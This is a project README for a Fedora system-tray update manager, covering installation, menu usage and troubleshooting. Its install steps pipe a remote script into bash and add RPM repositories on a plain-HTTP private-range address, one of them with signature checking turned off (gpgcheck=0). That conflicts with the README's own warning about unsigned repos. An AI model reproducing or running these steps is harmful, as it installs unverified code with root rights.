![Linux Tweaks](https://raw.githubusercontent.com/tolgaerok/linuxtweaks/main/FUN/FUN_IMAGES/1744722407588.png)

# 🫟 LinuxTweaks 2026 {#top}

[![Status: Under Development](https://img.shields.io/badge/Status-Under%20Development-orange)](https://github.com/tolgaerok/linuxtweaks)

**🫟  A simple, no-nonsense system update manager for Fedora...**

<!-- screenshot: LinuxTweaks Updater tray menu -->


I built this because I was tired of hunting through different tools to check updates. DNF, Flatpak, firmware all scattered. I wanted one place that just works.

## What It Does

**LinuxTweaks Updater** lives in your system tray and keeps Fedora up to date:

- **Checks in the background**: DNF packages and Flatpak apps, every 30 minutes by default (1 hour to 1 week to choose from), and again after the PC wakes from sleep
- **Tray icon at a glance**: red with the number of updates, orange when a reboot is pending, green when you're up to date
- **Notifications with buttons**: *Install all*, *DNF only*, *Flatpak only* or *Later* (reminds you again in 4 hours)
- **Installs when you say so**: all updates, or just DNF or just Flatpak, in a terminal window so you can see everything
- **Handles the after-update jobs**: tells you when a new kernel or core library needs a reboot, offers to restart services still running old code, lists changed config files (`.rpmnew`), cleans old caches and unused packages
- **Weekly maintenance**: cleans the DNF cache, trims the journal to 7 days, runs SSD TRIM (skipped if Fedora's own `fstrim.timer` does it)
- **What's new**: shows what changed after each update of the app itself
- **Signed packages**: everything in my repo is signed with my LinuxTweaks key

## Installation

### 👍 Quick Install

🔹 Sets up my repo, installs LinuxTweaks Updater, checks everything and starts the tray:

```bash
curl -fsSL https://raw.githubusercontent.com/tolgaerok/linuxtweaks/main/LINUXTWEAKS/POST-INSTALL/install-linuxtweaks.sh | bash
```

### 🖖 Or by hand

🔹 Add my repository:

```bash
echo -e "[linuxtweaks]\nname=LinuxTweaks Repository\nbaseurl=http://100.83.30.114:8080/linuxtweaks/\nenabled=1\ngpgcheck=1\ngpgkey=http://100.83.30.114:8080/linuxtweaks/RPM-GPG-KEY\nmetadata_expire=1h" | sudo tee /etc/yum.repos.d/linuxtweaks.repo > /dev/null
```

Install it (dnf asks once to import my signing key - answer **y**):

```bash
sudo dnf install --refresh linuxtweaks-updater
linuxtweaks-updater &
```

After that it starts by itself at every login, and new versions arrive with a normal `sudo dnf upgrade`.

### Coming from the old LinuxTweaks 6.x or dnf-updater?

Nothing special to do. LinuxTweaks Updater replaces both, so either of these swaps you over (and keeps your dnf-updater settings):

```bash
sudo dnf upgrade --refresh
```

```bash
sudo dnf install --refresh linuxtweaks-updater
```

If your `/etc/yum.repos.d/linuxtweaks.repo` is older than September 2026, re-run the *Add my repository* command above first - older copies didn't check package signatures.

### Add the linuxtweaks-io Repository
```bash
echo -e "[linuxtweaks-io]\nname=LinuxTweaks-IO Repository\nbaseurl=http://100.83.30.114:8080/linuxtweaks-io/\nenabled=1\ngpgcheck=0" | sudo tee /etc/yum.repos.d/linuxtweaks-io.repo > /dev/null

sudo dnf clean all
sudo dnf install -y linuxtweaks-io
```

### 📋 Verify Installation

```bash
dnf info linuxtweaks-updater
```

### 🪓 Uninstall

From the tray: **About → Uninstall…**, or:

```bash
sudo dnf remove linuxtweaks-updater
```

This removes the app, its timers, the menu launcher and its settings. Your installed packages and applied updates stay as they are.

### 📅 View Changelog

In the tray menu: **What's new**, or:

```bash
rpm -q --changelog linuxtweaks-updater
```

## Usage

Right-click the tray icon for the menu:

| Menu item | What it does |
|---|---|
| **DNF (n)** / **Flatpak (n)** | The waiting updates - and *Install ... updates only* when both kinds have some |
| **Run LinuxTweaks Updater** | Install all waiting updates |
| **Check for updates** | Check right now |
| **Check interval** | 1 hour, 6 hours, 1 day or 1 week |
| **Notifications** | On or off |
| **Weekly Maintenance** | On or off |
| **Reboot now** | Only shown when an update needs a reboot |
| **What's new** / **Logs** / **About** | Release notes, update history + the app's log, version, Help and Uninstall |

The full user guide is in the app: **About → Help**.

### From the Command Line

```bash
linuxtweaks-updater                     # start the tray (detaches - you can close the terminal)
linuxtweaks-updater --foreground        # start it attached, showing its output (troubleshooting)
linuxtweaks-updater-check               # check for updates and list them
linuxtweaks-updater-upgrade             # install all updates
linuxtweaks-updater-upgrade --dnf       # DNF packages only
linuxtweaks-updater-upgrade --flatpak   # Flatpak apps only
```

## How It Works

1. **Timer**: `linuxtweaks-updater-check.timer` (systemd user timer) checks for updates, and so does the tray at your chosen interval
2. **Check**: `dnf check-update` + `flatpak remote-ls --updates`, plus `dnf needs-restarting` to spot a pending reboot
3. **State**: results are saved in `~/.local/state/linuxtweaks-updater/`
4. **Tray**: watches that folder and updates the icon, menu and tooltip straight away
5. **Upgrade**: runs in a terminal, then offers the reboot / service restarts and cleans up

## 🛠️ Troubleshooting

**No tray icon?**
```bash
linuxtweaks-updater
```
It tells you whether it just started or was already running. To see what the tray prints while it runs:
```bash
linuxtweaks-updater --foreground
```

**Checks not running?**
```bash
systemctl --user --no-pager status linuxtweaks-updater-check.timer
journalctl --user --no-pager -u linuxtweaks-updater-check.service
```

**See everything it did** - tray menu **Logs**, or check by hand:
```bash
linuxtweaks-updater-check
```

**`No match for argument: linuxtweaks-updater`?** Your dnf still has an old copy of the repo list:
```bash
sudo dnf install --refresh linuxtweaks-updater
```

## Built For

- **OS**: Fedora 44+
- **Desktop**: KDE Plasma
- **Language**: Python (PyQt5) + Bash
- **Init**: Systemd

## Author

**Tolga Erok**  
Hamilton Hill, Perth, Western Australia  
📧 kingtolga@gmail.com  
🐙 [My other GitHub repo's](https://github.com/tolgaerok)

---

## Other Repositories

<div align="center">
  <table style="border-collapse: collapse; width: 100%; border: none;">
    <tr>
      <td align="center" style="border: none;">
        <a href="https://github.com/tolgaerok/fedora-tolga">
          <img src="https://flathub.org/img/distro/fedora.svg" alt="Fedora" style="width: 100%;">
          <br>Fedora
        </a>
      </td>
      <td align="center" style="border: none;">
        <a href="https://github.com/tolgaerok/Debian-tolga">
          <img src="https://flathub.org/img/distro/debian.svg" alt="Debian" style="width: 100%;">
          <br>Debian
        </a>
      </td>
    </tr>
  </table>
</div>

## Stats

<div align="center">
  <a href="https://git.io/streak-stats" target="_blank">
    <img src="http://github-readme-streak-stats.herokuapp.com?user=tolgaerok&theme=dark&background=000000" alt="GitHub Streak">
  </a>
  <br>
  <a href="https://github.com/anuraghazra/github-readme-stats" target="_blank">
    <img src="https://raw.githubusercontent.com/tolgaerok/linuxtweaks/main/FUN/FUN_IMAGES/1744722407588.png" alt="Top Languages">
  </a>
</div>

---

[⬆ Back to Top](#top)

---

**Made for my own system. Works great on yours too.**
